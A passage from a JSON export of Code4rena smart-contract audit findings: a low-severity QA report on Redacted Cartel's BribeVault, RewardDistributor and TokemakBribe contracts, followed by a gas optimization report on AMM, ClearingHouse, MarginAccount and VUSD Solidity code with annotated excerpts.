    "body": "## BribeVault: `fee` is not used anywhere\nThe variable is [set](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L65) and [allowed to be changed](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L108) and even an event is there, however it is not used anywhere.\nThe fees are [being read](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L272) directly from the admin's sent parameters and there's no check against the fee previously set.\nConsider removing it or aligning the `transferBribes` function to use it.\n\n## RewardDistributor: no sender check for ETH receive function\n[This](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/RewardDistributor.sol#L59) is RB's receive function:\n```\n    // Enables BribeVault to transfer native tokens\n    receive() external payable {}\n```\nIf it is only used from BribeVault, consider adding a check that verifies that the sender is BribeVault - otherwise misc ether might get sent and locked in the contract.\n\n## RewardDistributor: ETH being sent using `transfer`\nIn _claim, ETH is [being sent](](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/RewardDistributor.sol#L181)) using the `transfer` function.\nWhile this might be a design choice, it might cause problems and fail to transfer to smart contracts, [such as gnosis safe](https://help.gnosis-safe.io/en/articles/5249851-why-can-t-i-transfer-eth-from-a-contract-into-a-safe).\nThere are mitigations (see in the article), and this is why I rated it as a low issue and not medium. However, for normal user experience, consider changing the `transfer` to `call`. If the concern is reentrancy, you obviously know that there are other mitigations (CEI pattern and reentrancy guard).\n\n## TokemakBribe: consider adding sanity check for `round`\nWhen [setting a new round](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L108:#L110), as there is no check that `_newRound > _round`, a team member can add rounds \"retroactively\":\n```\n    function setRound(uint256 _newRound) external onlyAuthorized {\n        _round = _newRound;\n    }\n```\nI don't really consider this a danger.\nThe worst case would be that a team member (not the admin) listens to TXs in the mempool, and when somebody deposits a bribe, the team member would change the round to be another one which is more beneficial for the team member, and therefore the bribe would be misattributed.\nHowever, we are talking about a team member, plus the emergency withdraw function can withdraw it, plus \n anyway further releasing of the bribe to claimers requires admin actions. So I do not believe that this is a real risk. This is why I label this as low and not medium.\nHowever adding a check that `_newRound > _round` seems like an easy sanity check to add.\n\n## TokemakBribe: wrong comment for getRound\n[The comment](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L113:#L116) for `getRound` is same as for `setRound`.\n```\n    /**\n        @notice Set a new voting round\n        @return round uint256 The current round number\n     */\n    function getRound() external view returns (uint256) {\n```\n\n## ETH bribes dependent on BribeVault address\nRegarding using BribeVault's address as the native token address, [a comment](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L226) mentions \"For native tokens, the token address is set to this contract to prevent overwriting storage - the address can be anything but address(this) safer\".\nI might be missing something but I don't see how BribeVault's address is safer than an immutable like 0xEE..E.\nSince RewardDistributor [can change](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/RewardDistributor.sol#L65) BribeVault, this means that the reward identifier would also need to be changed.\nSo again, I might be missing something but at the moment it seems to me that using the changing BribeVault address as the native token identifier just adds complexity.\n\n## BribeVault: transferBribes: unchecked transfer of ERC20 tokens\nThe function [doesn't use](https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L296:#L297) safeTransfer for sending of tokens:\n```\n                IERC20(token).transfer(feeRecipient, feeAmount);\n                IERC20(token).transfer(distributor, distributorAmount);\n```\nThis might be on purpose, to not totally fail the whole loop and lose gas if one token is problematic and failed to send.\nIf so, make sure the admin properly checks that all transfers succeeded.\nFor easy checking I believe you can change to safeTransfer and use try/catch to emit an event if the transfer failed.",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/66"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [Summary](#summary)\n  - [File: AMM.sol](#file-ammsol)\n    - [function initialize()](#function-initialize)\n      - [Use `calldata` instead of `memory` for `string _name`](#use-calldata-instead-of-memory-for-string-_name)\n    - [function openPosition()](#function-openposition)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory)\n    - [function liquidatePosition()](#function-liquidateposition)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-1)\n    - [function removeLiquidity()](#function-removeliquidity)\n      - [Do not cache `positions[maker]` in memory](#do-not-cache-positionsmaker-in-memory)\n      - [Do not cache `makers[maker]` in memory](#do-not-cache-makersmaker-in-memory)\n    - [function getNotionalPositionAndUnrealizedPnl()](#function-getnotionalpositionandunrealizedpnl)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-2)\n      - [Do not cache `makers[trader]` in memory](#do-not-cache-makerstrader-in-memory)\n    - [function getPendingFundingPayment()](#function-getpendingfundingpayment)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-3)\n      - [Do not cache `makers[trader]` in memory](#do-not-cache-makerstrader-in-memory-1)\n    - [function getTakerNotionalPositionAndUnrealizedPnl()](#function-gettakernotionalpositionandunrealizedpnl)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-4)\n    - [function _emitPositionChanged()](#function-_emitpositionchanged)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-5)\n    - [function _openReversePosition()](#function-_openreverseposition)\n      - [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory-6)\n      - [Unchecked block L597](#unchecked-block-l597)\n    - [function _calcTwap()](#function-_calctwap)\n      - [Do not cache `reserveSnapshots[snapshotIndex]` in memory](#do-not-cache-reservesnapshotssnapshotindex-in-memory)\n      - [Cache `reserveSnapshots.length` in memory](#cache-reservesnapshotslength-in-memory)\n      - [Unchecked block L684](#unchecked-block-l684)\n      - [Use the cache for calculation](#use-the-cache-for-calculation)\n  - [File: ClearingHouse.sol](#file-clearinghousesol)\n    - [function _disperseLiquidationFee()](#function-_disperseliquidationfee)\n      - [Unchecked block L214](#unchecked-block-l214)\n  - [File: InsuranceFund.sol](#file-insurancefundsol)\n    - [function pricePerShare()](#function-pricepershare)\n      - [Unchecked block L97](#unchecked-block-l97)\n  - [File: Oracle.sol](#file-oraclesol)\n    - [function getUnderlyingTwapPrice()](#function-getunderlyingtwapprice)\n      - [Unchecked block L81](#unchecked-block-l81)\n  - [File: Interfaces.sol](#file-interfacessol)\n    - [struct Collateral](#struct-collateral)\n      - [Tight packing structs to save slots](#tight-packing-structs-to-save-slots)\n  - [File: MarginAccount.sol](#file-marginaccountsol)\n    - [function _getLiquidationInfo()](#function-_getliquidationinfo)\n      - [Do not cache `supportedCollateral[idx]` in memory](#do-not-cache-supportedcollateralidx-in-memory)\n    - [function _transferOutVusd()](#function-_transferoutvusd)\n      - [Unchecked block L588](#unchecked-block-l588)\n  - [File: VUSD.sol](#file-vusdsol)\n    - [function processWithdrawals()](#function-processwithdrawals)\n      - [Unchecked block L57-L65](#unchecked-block-l57-l65)\n      - [Cache `start` in memory](#cache-start-in-memory)\n  - [General recommendations](#general-recommendations)\n    - [Variables](#variables)\n      - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values)\n      - [Pre-increments cost less gas compared to post-increments](#pre-increments-cost-less-gas-compared-to-post-increments)\n    - [Comparisons](#comparisons)\n      - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n    - [For-Loops](#for-loops)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n      - [`++i` costs less gas compared to `i++`](#i-costs-less-gas-compared-to-i)\n      - [Increments can be unchecked](#increments-can-be-unchecked)\n    - [Arithmetics](#arithmetics)\n      - [Shift Right instead of Dividing by 2](#shift-right-instead-of-dividing-by-2)\n    - [Errors](#errors)\n      - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings)\n      - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n\n- **Storage-reading optimizations**\n\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **Unchecking arithmetics operations that can't underflow/overflow**\n\n> Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Summary\n\n- One pattern that was often seen is caching structs in memory when it's not needed. A copy in memory of a storage struct will trigger as many SLOADs as there are slots. If the struct's fields are only read once, or if the number of storage reading would be inferior to the number of slots: don't cache the struct in memory.\n\n## File: AMM.sol\n\n### function initialize()\n\n```\n093:     function initialize(\n094:         address _registry,\n095:         address _underlyingAsset,\n096:         string memory _name,//@audit readonly: calldata\n097:         address _vamm,\n098:         address _governance\n099:     ) external initializer {\n100:         _setGovernace(_governance);\n101: \n102:         vamm = IVAMM(_vamm);\n103:         underlyingAsset = _underlyingAsset;\n104:         name = _name;\n105:         fundingBufferPeriod = 15 minutes;\n106: \n107:         syncDeps(_registry);\n108:     }\n```\n\n#### Use `calldata` instead of `memory` for `string _name`\n\nAn external function passing a readonly variable should mark it as `calldata` and not `memory`\n\n### function openPosition()\n\n```\n113:     function openPosition(address trader, int256 baseAssetQuantity, uint quoteAssetLimit)\n114:         override\n115:         external\n116:         onlyClearingHouse\n117:         returns (int realizedPnl, uint quoteAsset, bool isPositionIncreased)\n118:     {\n119:         require(ammState == AMMState.Active, \"AMM.openPosition.not_active\");\n120:         Position memory position = positions[trader]; //@audit 3 SLOADs vs 1 enough\n121:         bool isNewPosition = position.size == 0 ? true : false;\n122:         Side side = baseAssetQuantity > 0 ? Side.LONG : Side.SHORT;\n123:         if (isNewPosition || (position.size > 0 ? Side.LONG : Side.SHORT) == side) {\n124:             // realizedPnl = 0;\n125:             quoteAsset = _increasePosition(trader, baseAssetQuantity, quoteAssetLimit);\n126:             isPositionIncreased = true;\n127:         } else {\n128:             (realizedPnl, quoteAsset, isPositionIncreased) = _openReversePosition(trader, baseAssetQuantity, quoteAssetLimit);\n129:         }\n130:         _emitPositionChanged(trader, realizedPnl);\n131:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nAs a copy in memory of a struct makes as many SLOADs as there are slots, here a copy costs 3 SLOADs:\n\n```\n41:     struct Position {\n42:         int256 size;\n43:         uint256 openNotional;\n44:         int256 lastPremiumFraction;\n45:     }\n```\n\nHowever, only the `size` field is read twice. Therefore, only this field should get cached: `int256 _size = positions[trader].size;`\n\n### function liquidatePosition()\n\n```\n133:     function liquidatePosition(address trader)\n134:         override\n135:         external\n136:         onlyClearingHouse\n137:         returns (int realizedPnl, uint quoteAsset)\n138:     {\n139:         // don't need an ammState check because there should be no active positions\n140:         Position memory position = positions[trader]; //@audit 3 SLOADs vs 1 enough\n141:         bool isLongPosition = position.size > 0 ? true : false;\n142:         // sending market orders can fk the trader. @todo put some safe guards around price of liquidations\n143:         if (isLongPosition) {\n144:             (realizedPnl, quoteAsset) = _reducePosition(trader, -position.size, 0);\n145:         } else {\n146:             (realizedPnl, quoteAsset) = _reducePosition(trader, -position.size, type(uint).max);\n147:         }\n148:         _emitPositionChanged(trader, realizedPnl);\n149:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nSimilar to [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory).\n\nHowever, only the `size` field is read 3 times. Therefore, only this field should get cached: `int256 _size = positions[trader].size;`\n\n### function removeLiquidity()\n\n```\n133:     function liquidatePosition(address trader)\n134:         override\n135:         external\n136:         onlyClearingHouse\n137:         returns (int realizedPnl, uint quoteAsset)\n138:     {\n139:         // don't need an ammState check because there should be no active positions\n140:         Position memory position = positions[trader]; //@audit 3 SLOADs vs 1 enough\n141:         bool isLongPosition = position.size > 0 ? true : false;\n142:         // sending market orders can fk the trader. @todo put some safe guards around price of liquidations\n143:         if (isLongPosition) {\n144:             (realizedPnl, quoteAsset) = _reducePosition(trader, -position.size, 0);\n145:         } else {\n146:             (realizedPnl, quoteAsset) = _reducePosition(trader, -position.size, type(uint).max);\n147:         }\n148:         _emitPositionChanged(trader, realizedPnl);\n149:     }\n```\n\n#### Do not cache `positions[maker]` in memory\n\nSimilar to [Do not cache `positions[trader]` in memory](#do-not-cache-positionstrader-in-memory).\nHowever, here, even the fields shouldn't get cached, as they are read only once:\n\n```\n220:         Position memory _taker = positions[maker];//@audit 3 SLOADs vs 2 enough\n...\n233:             _taker.size,\n234:             _taker.openNotional\n```\n\nTherefore, use `220:         Position storage _taker = positions[maker];`\n\n#### Do not cache `makers[maker]` in memory\n\nSimilarly, a copy in memory for `Maker` costs 7 SLOADs:\n\n```\n48:     struct Maker {\n49:         uint vUSD;\n50:         uint vAsset;\n51:         uint dToken;\n52:         int pos; // position\n53:         int posAccumulator; // value of global.posAccumulator until which pos has been updated\n54:         int lastPremiumFraction;\n55:         int lastPremiumPerDtoken;\n56:     }\n```\n\nHere, caching the first 5 fields in memory is enough.\n\n### function getNotionalPositionAndUnrealizedPnl()\n\n```\n395:     function getNotionalPositionAndUnrealizedPnl(address trader)\n396:         override\n397:         external\n398:         view\n399:         returns(uint256 notionalPosition, int256 unrealizedPnl, int256 size, uint256 openNotional)\n400:     {\n401:         Position memory _taker = positions[trader];//@audit 3 SLOADs vs 2 enough\n402:         Maker memory _maker = makers[trader];//@audit 7 SLOADs vs 3 enough\n403: \n404:         (notionalPosition, size, unrealizedPnl, openNotional) = vamm.get_notional(\n405:             _maker.dToken,\n406:             _maker.vUSD,\n407:             _maker.vAsset,\n408:             _taker.size,\n409:             _taker.openNotional\n410:         );\n411:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nHere, we need `Position storage _taker = positions[trader];`\n\n#### Do not cache `makers[trader]` in memory\n\nHere, we need `Maker storage _maker = makers[trader];`\n\n### function getPendingFundingPayment()\n\n```\n425:         Position memory taker = positions[trader];//@audit 3 SLOADs vs 2 enough\n...\n434:         Maker memory maker = makers[trader];//@audit 7 SLOADs vs 5 enough\n```\n\n#### Do not cache `positions[trader]` in memory\n\nHere, we need `Position storage _taker = positions[trader];`\n\n#### Do not cache `makers[trader]` in memory\n\nHere, we need `Maker storage _maker = makers[trader];`\n\n### function getTakerNotionalPositionAndUnrealizedPnl()\n\n```\n458:     function getTakerNotionalPositionAndUnrealizedPnl(address trader) override public view returns(uint takerNotionalPosition, int256 unrealizedPnl) {\n459:         Position memory position = positions[trader];//@audit 3 SLOADs vs 2 enough\n460:         if (position.size > 0) {\n461:             takerNotionalPosition = vamm.get_dy(1, 0, position.size.toUint256());\n462:             unrealizedPnl = takerNotionalPosition.toInt256() - position.openNotional.toInt256();\n463:         } else if (position.size < 0) {\n464:             takerNotionalPosition = vamm.get_dx(0, 1, (-position.size).toUint256());\n465:             unrealizedPnl = position.openNotional.toInt256() - takerNotionalPosition.toInt256();\n466:         }\n467:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nHere, we need to cache these fields: `size` and `openNotional`\n\n### function _emitPositionChanged()\n\n```\n527:     function _emitPositionChanged(address trader, int256 realizedPnl) internal {\n528:         Position memory position = positions[trader];//@audit 3 SLOADs vs 2 enough\n529:         emit PositionChanged(trader, position.size, position.openNotional, realizedPnl);\n530:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nHere, we need `Position storage _taker = positions[trader];`\n\n### function _openReversePosition()\n\n```\n584:     function _openReversePosition(address trader, int256 baseAssetQuantity, uint quoteAssetLimit)\n585:         internal\n586:         returns (int realizedPnl, uint quoteAsset, bool isPositionIncreased)\n587:     {\n588:         Position memory position = positions[trader];//@audit 3 SLOADs vs 1 enough\n589:         if (abs(position.size) >= abs(baseAssetQuantity)) {\n590:             (realizedPnl, quoteAsset) = _reducePosition(trader, baseAssetQuantity, quoteAssetLimit);\n591:         } else {\n592:             uint closedRatio = (quoteAssetLimit * abs(position.size).toUint256()) / abs(baseAssetQuantity).toUint256();\n593:             (realizedPnl, quoteAsset) = _reducePosition(trader, -position.size, closedRatio);\n594: \n595:             // this is required because the user might pass a very less value (slippage-prone) while shorting\n596:             if (quoteAssetLimit >= quoteAsset) {\n597:                 quoteAssetLimit -= quoteAsset; //@audit uncheck (see L596)\n598:             }\n599:             quoteAsset += _increasePosition(trader, baseAssetQuantity + position.size, quoteAssetLimit);\n600:             isPositionIncreased = true;\n601:         }\n602:     }\n```\n\n#### Do not cache `positions[trader]` in memory\n\nHere, we need to cache the `size` field\n\n#### Unchecked block L597\n\nThis line can't underflow due to the condition L596. Therefore, it should be wrapped in an `unchecked` block\n\n### function _calcTwap()\n\n```\n656:     function _calcTwap(uint256 _intervalInSeconds)\n657:         internal\n658:         view\n659:         returns (uint256)\n660:     {\n661:         uint256 snapshotIndex = reserveSnapshots.length - 1; //@audit reserveSnapshots.length  SLOAD 1\n662:         uint256 currentPrice = reserveSnapshots[snapshotIndex].lastPrice;\n663:         if (_intervalInSeconds == 0) {\n664:             return currentPrice;\n665:         }\n666: \n667:         uint256 baseTimestamp = _blockTimestamp() - _intervalInSeconds;\n668:         ReserveSnapshot memory currentSnapshot = reserveSnapshots[snapshotIndex];//@audit 3 SLOADs vs 1 enough\n669:         // return the latest snapshot price directly\n670:         // if only one snapshot or the timestamp of latest snapshot is earlier than asking for\n671:         if (reserveSnapshots.length == 1 || currentSnapshot.timestamp <= baseTimestamp) {//@audit reserveSnapshots.length  SLOAD 2\n...\n675:         uint256 previousTimestamp = currentSnapshot.timestamp;\n676:         uint256 period = _blockTimestamp() - previousTimestamp;\n677:         uint256 weightedPrice = currentPrice * period;\n678:         while (true) {\n...\n680:             if (snapshotIndex == 0) {\n681:                 return weightedPrice / period;\n682:             }\n...\n684:             snapshotIndex = snapshotIndex - 1; //@audit uncheck (see L680-L682)\n685:             currentSnapshot = reserveSnapshots[snapshotIndex];\n686:             currentPrice = reserveSnapshots[snapshotIndex].lastPrice; //@audit use currentSnapshot.lastPrice\n...\n689:             if (currentSnapshot.timestamp <= baseTimestamp) {\n...\n698:             uint256 timeFraction = previousTimestamp - currentSnapshot.timestamp;\n...\n701:             previousTimestamp = currentSnapshot.timestamp;\n```\n\n#### Do not cache `reserveSnapshots[snapshotIndex]` in memory\n\nHere, we need to cache the `timestamp` field. Copying the struct in memory costs 3 SLOADs.\n\n#### Cache `reserveSnapshots.length` in memory\n\nThis would save 1 SLOAD\n\n#### Unchecked block L684\n\nThis line can't underflow due to the condition L680-L682. Therefore, it should be wrapped in an `unchecked` block\n\n#### Use the cache for calculation\n\nAs we already have `currentSnapshot = reserveSnapshots[snapshotIndex];`: use it here: `currentPrice = currentSnapshot.lastPrice;`\n\n## File: ClearingHouse.sol\n\n### function _disperseLiquidationFee()\n\n```\n210:     function _disperseLiquidationFee(uint liquidationFee) internal {\n211:         if (liquidationFee > 0) {\n212:             uint toInsurance = liquidationFee / 2;\n213:             marginAccount.transferOutVusd(address(insuranceFund), toInsurance);\n214:             marginAccount.transferOutVusd(_msgSender(), liquidationFee - toInsurance); //@audit uncheck (see L212)\n215:         }\n216:     }\n```\n\n#### Unchecked block L214\n\nThis line can't underflow due to the condition L212. Therefore, it should be wrapped in an `unchecked` block\n\n## File: InsuranceFund.sol\n\n### function pricePerShare()\n\n```\nFile: InsuranceFund.sol\n094:     function pricePerShare() external view returns (uint) {\n095:         uint _totalSupply = totalSupply();\n096:         uint _balance = balance();\n097:         _balance -= Math.min(_balance, pendingObligation); //@audit uncheck\n098:         if (_totalSupply == 0 || _balance == 0) \n099:             return PRECISION;\n100:         }\n101:         return _balance * PRECISION / \n_totalSupply;\n102:     }\n```\n\n#### Unchecked block L97\n\nThis line can't underflow for obvious mathematical reasons (`_balance` substracting at most itself). Therefore, it should be wrapped in an `unchecked` block\n\n## File: Oracle.sol\n\n### function getUnderlyingTwapPrice()\n\n#### Unchecked block L81\n\nThis line can't underflow due to L76-L79. Therefore, it should be wrapped in an `unchecked` block\n\n## File: Interfaces.sol\n\n### struct Collateral\n\n#### Tight packing structs to save slots\n\nWhile this file is out of scope, it deeply impacts MarginAccount.sol.\nI suggest going from:\n\n```\n94:     struct Collateral {\n95:         IERC20 token; //@audit 20 bytes\n96:         uint weight; //@audit 32 bytes\n97:         uint8 decimals; //@audit 1 byte\n98:     }\n```\n\nto\n\n```\n94:     struct Collateral {\n95:         IERC20 token; //@audit 20 bytes\n96:         uint8 decimals; //@audit 1 byte\n97:         uint weight; //@audit 32 bytes\n98:     }\n```\n\nTo save 1 slot per array element in MarginAccount.sol's storage\n\n## File: MarginAccount.sol\n\n### function _getLiquidationInfo()\n\n```\n460:     function _getLiquidationInfo(address trader, uint idx) internal view returns (LiquidationBuffer memory buffer) {\n461:         require(idx > VUSD_IDX && idx < supportedCollateral.length, \"collateral not seizable\");\n462:         (buffer.status, buffer.repayAble, buffer.incentivePerDollar) = isLiquidatable(trader, false);\n463:         if (buffer.status == IMarginAccount.LiquidationStatus.IS_LIQUIDATABLE) {\n464:             Collateral memory coll = supportedCollateral[idx];//@audit 3 SLOADs vs 2 enough\n465:             buffer.priceCollateral = oracle.getUnderlyingPrice(address(coll.token)).toUint256();\n466:             buffer.decimals = coll.decimals;\n467:         }\n468:     }\n```\n\n#### Do not cache `supportedCollateral[idx]` in memory\n\nHere, we need `Collateral storage coll = supportedCollateral[idx];`. Copying the struct in memory costs 3 SLOADs.\n\n### function _transferOutVusd()\n\n#### Unchecked block L588\n\nThis line can't underflow due to L583. Therefore, it should be wrapped in an `unchecked` block\n\n## File: VUSD.sol\n\n### function processWithdrawals()\n\n```\n53:     function processWithdrawals() external {\n54:         uint reserve = reserveToken.balanceOf(address(this));\n55:         require(reserve >= withdrawals[start].amount, 'Cannot process withdrawals at this time: Not enough balance'); //@audit start SLOAD 1\n56:         uint i = start;//@audit start SLOAD 2\n57:         while (i < withdrawals.length && (i - start) <= maxWithdrawalProcesses) { //@audit uncheck whole //@audit start SLOAD 3\n58:             Withdrawal memory withdrawal = withdrawals[i]; //@audit-ok\n59:             if (reserve < withdrawal.amount) {\n60:                 break;\n61:             }\n62:             reserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\n63:             reserve -= withdrawal.amount;  //@audit uncheck (see L59-L61)\n64:             i += 1;\n65:         }\n66:         start = i;\n67:     }\n```\n\n#### Unchecked block L57-L65\n\nThe whole while-loop can't underflow. Therefore, it should be wrapped in an `unchecked` block\n\n#### Cache `start` in memory\n\nCache `start` in memory as `initialStart` and use it L55 + L57 (compare `i` to it in the while-loop)\n\n## General recommendations\n\n### Variables\n\n#### No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:  \n\n```\nClearingHouse.sol:122:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:130:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:170:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:194:        for (uint i = 0; i < amms.length; i++) { // liquidate all positions\nClearingHouse.sol:251:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:263:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:277:        for (uint i = 0; i < amms.length; i++) {\nInsuranceFund.sol:52:        uint shares = 0;\nMarginAccount.sol:31:    uint constant VUSD_IDX = 0;\nMarginAccount.sol:331:        for (uint i = 0; i < idxs.length; i++) {\nMarginAccount.sol:521:        for (uint i = 0; i < assets.length; i++) {\nMarginAccount.sol:552:        for (uint i = 0; i < _collaterals.length; i++) {\nMarginAccountHelper.sol:13:    uint constant VUSD_IDX = 0;\n```\n\nI suggest removing explicit initializations for default values.\n\n#### Pre-increments cost less gas compared to post-increments\n\n### Comparisons\n\n#### `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\n`> 0` in require statements are used in the following location(s):\n\n```\nAMM.sol:487:        require(baseAssetQuantity > 0, \"VAMM._long: baseAssetQuantity is <= 0\");\nAMM.sol:511:        require(baseAssetQuantity < 0, \"VAMM._short: baseAssetQuantity is >= 0\");\nClearingHouse.sol:51:        require(_maintenanceMargin > 0, \"_maintenanceMargin < 0\");\nMarginAccount.sol:150:        require(amount > 0, \"Add non-zero margin\");\nOracle.sol:153:        require(_round > 0, \"Not enough history\");\n```\n\nI suggest you change `> 0` with `!= 0` in require statements. Also, enable the Optimizer.\n\n### For-Loops\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```\nClearingHouse.sol:122:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:130:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:170:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:194:        for (uint i = 0; i < amms.length; i++) { // liquidate all positions\nClearingHouse.sol:251:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:263:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:277:        for (uint i = 0; i < amms.length; i++) {\nMarginAccount.sol:331:        for (uint i = 0; i < idxs.length; i++) {\nMarginAccount.sol:373:        for (uint i = 1 /* skip vusd */; i < assets.length; i++) {\nMarginAccount.sol:521:        for (uint i = 0; i < assets.length; i++) {\nMarginAccount.sol:552:        for (uint i = 0; i < _collaterals.length; i++) {\n```\n\n#### `++i` costs less gas compared to `i++`\n\n`++i` costs less gas compared to `i++` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  \n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nInstances include:  \n\n```\nClearingHouse.sol:122:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:130:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:170:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:194:        for (uint i = 0; i < amms.length; i++) { // liquidate all positions\nClearingHouse.sol:251:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:263:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:277:        for (uint i = 0; i < amms.length; i++) {\nMarginAccount.sol:331:        for (uint i = 0; i < idxs.length; i++) {\nMarginAccount.sol:373:        for (uint i = 1 /* skip vusd */; i < assets.length; i++) {\nMarginAccount.sol:521:        for (uint i = 0; i < assets.length; i++) {\nMarginAccount.sol:552:        for (uint i = 0; i < _collaterals.length; i++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:  \n\n```\nClearingHouse.sol:122:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:130:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:170:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:194:        for (uint i = 0; i < amms.length; i++) { // liquidate all positions\nClearingHouse.sol:251:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:263:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:277:        for (uint i = 0; i < amms.length; i++) {\nMarginAccount.sol:331:        for (uint i = 0; i < idxs.length; i++) {\nMarginAccount.sol:373:        for (uint i = 1 /* skip vusd */; i < assets.length; i++) {\nMarginAccount.sol:521:        for (uint i = 0; i < assets.length; i++) {\nMarginAccount.sol:552:        for (uint i = 0; i < _collaterals.length; i++) {\n```\n\nThe code would go from:  \n  \n```\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:  \n\n```\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n### Arithmetics  \n\n#### Shift Right instead of Dividing by 2\n\nA division by 2 can be calculated by shifting one to the right.  \n  \nWhile the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a 